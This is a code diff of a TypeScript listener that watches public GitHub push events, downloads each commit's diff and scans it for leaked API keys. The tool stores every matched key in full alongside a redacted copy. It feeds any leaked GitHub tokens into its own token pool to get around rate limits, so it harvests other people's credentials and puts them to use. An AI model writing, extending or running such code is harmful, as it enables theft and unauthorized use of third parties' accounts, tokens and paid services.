@@ -6,7 +6,6 @@ import { isValidKey } from './apiKeyValidator';
 import { ConcurrencyManager } from '../utils/concurrencyManager';
 import { LRUCache } from '../utils/lruCache';
 import { CircuitBreaker } from '../utils/circuitBreaker';
-import { retryWithBackoff } from '../utils/retryWithBackoff';
 import { dbResilienceManager } from '../utils/dbResilience';
 import { ILeak, Leak } from '../models/Leak';
 import { FARM_CONSTANTS } from './farmConstants';
@@ -16,13 +15,10 @@ const POLL_INTERVAL = 60000;
 const MAX_QUEUE = 1000;
 const CONCURRENCY = 10;
 const COMMIT_TIMEOUT = 15000;
-const RAW_TIMEOUT = 10000;
 const CORE_FLOOR = 500;
 const CORE_RESUME = 1000;
+const DIFF_MAX_SIZE = 5 * 1024 * 1024;
 const REDACTION = { PREFIX: 6, SUFFIX: 6, TOTAL: 32 };
-
-const DOC_SKIP = [/^readme(\.md|\.txt)?$/i, /^license(\.md|\.txt)?$/i, /^contributing(\.md|\.txt)?$/i, /^changelog(\.md|\.txt)?$/i];
-const HIGH_RISK = new Set(FARM_CONSTANTS.PATTERNS.HIGH_RISK_FILES.map(f => f.toLowerCase()));
 
 function redactKey(key: string): string {
   if (key.length <= 12) return key;
@@ -31,16 +27,23 @@ function redactKey(key: string): string {
   return `${p}${'*'.repeat(Math.max(REDACTION.TOTAL - p.length - s.length, 0))}${s}`;
 }
 
+function parseDiffSections(diff: string): Array<{ filePath: string; content: string }> {
+  const sections: Array<{ filePath: string; content: string }> = [];
+  const parts = diff.split(/^diff --git /m);
+  for (const part of parts) {
+    if (!part.trim()) continue;
+    const headerMatch = part.match(/^a\/(.+?) b\//);
+    if (!headerMatch) continue;
+    sections.push({ filePath: headerMatch[1]!, content: part });
+  }
+  return sections;
+}
+
 interface GitHubEvent {
   id: string;
   type: string;
   repo: { name: string };
   payload: { head?: string; before?: string; ref?: string; size?: number };
-}
-
-interface CommitFile {
-  filename: string;
-  status: string;
 }
 
 class CoreBudgetGuard {
@@ -184,63 +187,48 @@ export class GitHubEventsListener {
       const token = rateLimitOptimizer.getCurrentToken();
       if (!token) return;
 
-      const commitRes = await retryWithBackoff(
-        () => axios.get(commitUrl, {
-          headers: { Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3+json' },
-          timeout: COMMIT_TIMEOUT,
-        }),
-        { maxRetries: 2, baseDelay: 1000, maxDelay: 10000 },
-        'EVENTS-COMMIT'
-      );
-
-      this.coreGuard.update(commitRes.headers);
-
-      const files: CommitFile[] = commitRes.data?.files || [];
-      const targets = files.filter(f => {
-        if (f.status === 'removed') return false;
-        const name = f.filename.split('/').pop()?.toLowerCase() || '';
-        return !DOC_SKIP.some(p => p.test(name)) && HIGH_RISK.has(name);
+      const diffRes = await axios.get(commitUrl, {
+        headers: { Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3.diff' },
+        timeout: COMMIT_TIMEOUT,
+        transformResponse: [d => d],
+        maxContentLength: DIFF_MAX_SIZE,
+        maxBodyLength: DIFF_MAX_SIZE,
+        validateStatus: s => s === 200 || s === 404 || s === 422,
       });
 
-      if (!targets.length) {
-        logger.events(`No high-risk files in ${repo}@${sha.substring(0, 8)} (${files.length} total files)`);
-        return;
-      }
-      logger.events(`Processing ${targets.length} files from ${repo}@${sha.substring(0, 8)}`);
+      this.coreGuard.update(diffRes.headers);
+      if (diffRes.status !== 200) return;
 
-      for (const file of targets) {
-        const ck = `ef:${sha}:${file.filename}`;
-        if (this.cache.has(ck)) continue;
-        this.cache.set(ck, true);
+      const diff = typeof diffRes.data === 'string' ? diffRes.data : null;
+      if (!diff || diff.length === 0) return;
 
-        try {
-          const raw = await axios.get(`https://raw.githubusercontent.com/${repo}/${sha}/${file.filename}`, {
-            timeout: RAW_TIMEOUT, transformResponse: [d => d], maxContentLength: FARM_CONSTANTS.LIMITS.MAX_FILE_SIZE_BYTES,
+      const sections = parseDiffSections(diff);
+      if (!sections.length) return;
+
+      const leaks: Partial<ILeak>[] = [];
+      const repoUrl = `https://github.com/${repo}`;
+
+      for (const section of sections) {
+        const matches = regexRouter.scan(section.content);
+        if (!matches.length) continue;
+
+        for (const { key, provider } of matches) {
+          if (!isValidKey(key)) continue;
+          if (provider === 'github-token') { rateLimitOptimizer.onboardToken(key).catch(() => { }); continue; }
+          leaks.push({
+            redactedKey: redactKey(key), fullKey: key, provider, repoUrl,
+            filePath: section.filePath, leakIntroducedAt: new Date(), repoCreatedAt: new Date(),
           });
-
-          const content = typeof raw.data === 'string' ? raw.data : null;
-          if (!content) continue;
-
-          const matches = regexRouter.scan(content);
-          if (!matches.length) continue;
-
-          const leaks: Partial<ILeak>[] = [];
-          const repoUrl = `https://github.com/${repo}`;
-
-          for (const { key, provider } of matches) {
-            if (!isValidKey(key)) continue;
-            if (provider === 'github-token') { rateLimitOptimizer.onboardToken(key).catch(() => { }); continue; }
-            leaks.push({
-              redactedKey: redactKey(key), fullKey: key, provider, repoUrl,
-              filePath: file.filename, leakIntroducedAt: new Date(), repoCreatedAt: new Date(),
-            });
-            logger.leak(provider, `${repo} | ${file.filename} | ${redactKey(key)}`);
-          }
-
-          if (leaks.length) await this.upsertLeaks(leaks);
-        } catch { /* skip individual file failures */ }
+          logger.leak(provider, `${repo} | ${section.filePath} | ${redactKey(key)}`);
+        }
       }
-    } catch (e) {
+
+      if (leaks.length) {
+        logger.events(`Found ${leaks.length} leak(s) in ${repo}@${sha.substring(0, 8)}`);
+        await this.upsertLeaks(leaks);
+      }
+    } catch (e: any) {
+      if (e?.code === 'ERR_BAD_RESPONSE' || e?.message?.includes('maxContentLength')) return;
       logger.events(`Commit ${sha.substring(0, 8)} failed: ${e instanceof Error ? e.message : String(e)}`);
     }
   }
